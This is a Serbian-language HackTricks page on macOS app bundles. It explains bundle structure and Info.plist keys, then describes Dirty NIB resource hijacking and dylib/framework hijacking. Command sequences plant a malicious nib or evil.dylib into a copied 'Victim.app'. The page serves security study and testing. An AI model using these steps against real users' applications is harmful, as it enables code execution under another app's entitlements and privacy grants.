# macOS paketi

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Paketi u macOS-u služe kao kontejneri za različite resurse, uključujući aplikacije, biblioteke i druge neophodne fajlove, zbog čega se u Finder-u prikazuju kao pojedinačni objekti, poput poznatih `*.app` fajlova. Najčešći paket sa kojim ćete se susresti jeste `.app` paket, iako su česti i drugi tipovi, kao što su `.framework`, `.systemextension` i `.kext`.

### Osnovne komponente paketa

U paketu, naročito unutar direktorijuma `<application>.app/Contents/`, nalazi se veliki broj važnih resursa:

- **\_CodeSignature**: Ovaj direktorijum čuva detalje code-signing-a koji su neophodni za proveru integriteta aplikacije. Informacije o code-signing-u možete pregledati pomoću komandi kao što su:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Sadrži izvršni binary aplikacije koji se pokreće nakon interakcije korisnika.
- **Resources**: Repozitorijum za komponente korisničkog interfejsa aplikacije, uključujući slike, dokumente i opise interfejsa (nib/xib fajlove).
- **Info.plist**: Služi kao glavna konfiguraciona datoteka aplikacije, ključna za to da sistem pravilno prepozna aplikaciju i komunicira sa njom.

#### Važni ključevi u Info.plist

Datoteka `Info.plist` predstavlja osnovu konfiguracije aplikacije i sadrži ključeve kao što su:

- **CFBundleExecutable**: Navodi naziv glavnog izvršnog fajla koji se nalazi u direktorijumu `Contents/MacOS`.
- **CFBundleIdentifier**: Obezbeđuje globalni identifikator aplikacije, koji macOS intenzivno koristi za upravljanje aplikacijom.
- **LSMinimumSystemVersion**: Označava minimalnu verziju macOS-a potrebnu za pokretanje aplikacije.

### Istraživanje Bundles

Za istraživanje sadržaja bundle-a, kao što je `Safari.app`, može se koristiti sledeća komanda: `bash ls -lR /Applications/Safari.app/Contents`

Ovo istraživanje otkriva direktorijume kao što su `_CodeSignature`, `MacOS`, `Resources` i fajlove kao što je `Info.plist`, pri čemu svaki ima posebnu ulogu, od zaštite aplikacije do definisanja njenog korisničkog interfejsa i operativnih parametara.

#### Dodatni direktorijumi Bundle-a

Pored uobičajenih direktorijuma, bundles mogu da sadrže i:

- **Frameworks**: Sadrži framework-e uključene u aplikaciju. Frameworks su slični dylib fajlovima, ali sa dodatnim resursima.
- **PlugIns**: Direktorijum za plug-inove i ekstenzije koje proširuju mogućnosti aplikacije.
- **XPCServices**: Sadrži XPC servise koje aplikacija koristi za komunikaciju izvan procesa.

Ova struktura obezbeđuje da sve neophodne komponente budu obuhvaćene bundle-om, čime se omogućava modularno i bezbedno okruženje aplikacije.

Za detaljnije informacije o ključevima u `Info.plist` datoteci i njihovim značenjima, Apple developer dokumentacija pruža opsežne resurse: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).<sup>[[3]](#references)</sup>

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Kada se quarantined bundle prvi put izvrši, macOS obavlja dubinsku proveru signature-a i može ga pokrenuti iz randomizovane translocated putanje. Nakon prihvatanja, naredna pokretanja obavljaju samo površinske provere; resource fajlovi u `Resources/`, `PlugIns/`, nib fajlovi itd. istorijski nisu bili proveravani. Od macOS 13 Ventura, dubinska provera se primenjuje pri prvom pokretanju, a nova TCC dozvola *App Management* ograničava third-party procese u izmeni drugih bundle-ova bez pristanka korisnika, ali stariji sistemi i dalje ostaju ranjivi.
- **Bundle Identifier collisions**: Više embedded target-a (PlugIns, helper tools) koji ponovo koriste isti `CFBundleIdentifier` mogu narušiti validaciju signature-a i povremeno omogućiti hijacking/confusion URL scheme-a. Uvek enumerišite sub-bundles i proverite jedinstvenost ID-jeva.

## Resource Hijacking (Dirty NIB / NIB Injection)

Pre Ventura-e, zamena UI resource-a u signed aplikaciji mogla je da zaobiđe površinsko code signing proveravanje i omogući code execution sa entitlements aplikacije. Aktuelna istraživanja (2024) pokazuju da ovo i dalje funkcioniše na sistemima starijim od Ventura-e i u un-quarantined builds:<sup>[[1]](#references)[[2]](#references)</sup>

1. Kopirajte target aplikaciju na lokaciju u koju je moguće upisivati, na primer `/tmp/Victim.app`.
2. Zamenite `Contents/Resources/MainMenu.nib` (ili bilo koji nib naveden u `NSMainNibFile`) malicious fajlom koji instancira `NSAppleScript`, `NSTask` itd.
3. Pokrenite aplikaciju. Malicious nib se izvršava pod bundle ID-jem i entitlements aplikacije žrtve (TCC grants, pristup mikrofonu/kameri itd.).
4. Ventura+ ublažava ovaj problem tako što pri prvom pokretanju obavlja dubinsku verifikaciju bundle-a i zahteva *App Management* permission za kasnije izmene, zbog čega je persistence teži, ali initial-launch attacks na starijim verzijama macOS-a i dalje funkcionišu.<sup>[[1]](#references)</sup>

Minimalni primer malicious nib payload-a (kompajlirajte xib u nib pomoću `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking unutar Bundle-ova

Budući da `@rpath` pretrage daje prednost bundled Framework-ovima, ubacivanje zlonamerne biblioteke unutar `Contents/Frameworks/` ili `Contents/PlugIns/` može preusmeriti redosled učitavanja kada je glavni binary potpisan bez library validation-a ili sa slabim redosledom `LC_RPATH` putanja.

Tipični koraci pri zloupotrebi unsigned/ad-hoc bundle-a:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Napomene:
- Hardened runtime bez prisutnog `com.apple.security.cs.disable-library-validation` blokira dylib datoteke trećih strana; prvo proverite entitlements.
- XPC servisi u fascikli `Contents/XPCServices/` često učitavaju susedne framework datoteke — na sličan način izmenite njihove binarne datoteke radi persistence ili putanja za privilege escalation.

## Kratki podsetnik za inspekciju
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Reference

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
- [3] [Apple Developer - Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)

{{#include ../../../banners/hacktricks-training.md}}
